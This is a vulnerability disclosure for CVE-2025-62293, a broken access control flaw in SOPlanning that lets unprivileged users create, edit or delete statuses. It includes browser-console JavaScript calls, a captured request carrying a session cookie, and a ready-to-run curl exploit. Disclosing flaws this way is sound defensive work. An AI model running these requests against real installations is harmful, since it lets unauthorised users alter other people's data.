# (CVE-2025-62293) Broken Access Control - Statuses
## üìù Description
> Broken Access Control (BAC) vulnerability in SOPlanning <1.54, due to lack of proper authorization check. The basic user without any permissions could add/edit/delete statuses.
## üìà CVSS Score
- **Base Score:** 5.3 (Medium)
- **Vector String:** CVSS:3.1AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

## üß™ Proof of Concept (PoC)
> The basic user without any permissions could access the Statuses. The attacker could open the Dev Tools --> console and paste one of the following scripts to open Status creation/modify/delete:
```
javascript:xajax_modifStatus();undefined; //New Status
javascript:xajax_modifStatus('test');undefined; // Edit status
javascript:xajax_supprimerStatus('test');undefined; // Delete Status (it tells insufficient right but delete the status)
```
> Status name could be obtained from Advanced Filters on the main page:
> ![[Pasted image 20250724144537.png]]
> After pasting one of the above javascript:xajax functions the window opened and the basic user was able to add/edit/delete statuses.
Request:
```
POST /process/xajax_server HTTP/2

Host: lukasz.soplanning.pro

Cookie: baseLigne=users; baseColonne=jours; afficherTableauRecap=1; xposMoisWin=0; xposJoursWin=0; yposJoursWin=0; masquerLigneVide=1; sop5834planning_=8shn0sbclf34tl1dooh05mv6cl; date_debut_affiche=19%2F07%2F2025; date_fin_affiche=04%2F09%2F2025; dateDebut=19/07/2025; dateFin=04/09/2025; dimensionCase=reduit; yposMoisWin=0; filtreStatutTache=%5B%22progress%22%2C%22done%22%2C%22abort%22%2C%22asd%22%5D
[...]

xajax=submitFormStatus&xajaxr=1753361214458&xajaxargs[]=&xajaxargs[]=test&xajaxargs[]=test&xajaxargs[]=test&xajaxargs[]=tp&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=1&xajaxargs[]=1&xajaxargs[]=0&xajaxargs[]=%23ffffff&xajaxargs[]=5
```
Response:
```
HTTP/2 200 OK
[...]



<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[window.location = "status";]]></cmd></xjx>
```

Curl exploit(Change Hosts and cookie session):
```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: lukasz.soplanning.pro' -H $'Content-Length: 272' -H $'Method: POST ./process/xajax_server HTTP/1.1' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36' -H $'Sec-Ch-Ua: \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Accept: */*' -H $'Origin: https://lukasz.soplanning.pro' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://lukasz.soplanning.pro/planning' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Priority: u=1, i' \
    -b $'baseLigne=users; baseColonne=jours; afficherTableauRecap=1; xposMoisWin=0; xposJoursWin=0; yposJoursWin=0; masquerLigneVide=1; sop5834planning_=8shn0sbclf34tl1dooh05mv6cl; date_debut_affiche=19%2F07%2F2025; date_fin_affiche=04%2F09%2F2025; dateDebut=19/07/2025; dateFin=04/09/2025; dimensionCase=reduit; yposMoisWin=0; filtreStatutTache=%5B%22progress%22%2C%22done%22%2C%22abort%22%2C%22asd%22%5D' \
    --data-binary $'xajax=submitFormStatus&xajaxr=1753361214458&xajaxargs[]=&xajaxargs[]=test&xajaxargs[]=test&xajaxargs[]=test&xajaxargs[]=tp&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=1&xajaxargs[]=1&xajaxargs[]=0&xajaxargs[]=%23ffffff&xajaxargs[]=5' \
    $'https://lukasz.soplanning.pro/process/xajax_server'
```
The new task status appeared on the main page under the Advanced filters:
![[Pasted image 20250724144905.png]]

## üõ†Ô∏è Recommendation / Fix

Implement a proper authorization - roles validation.
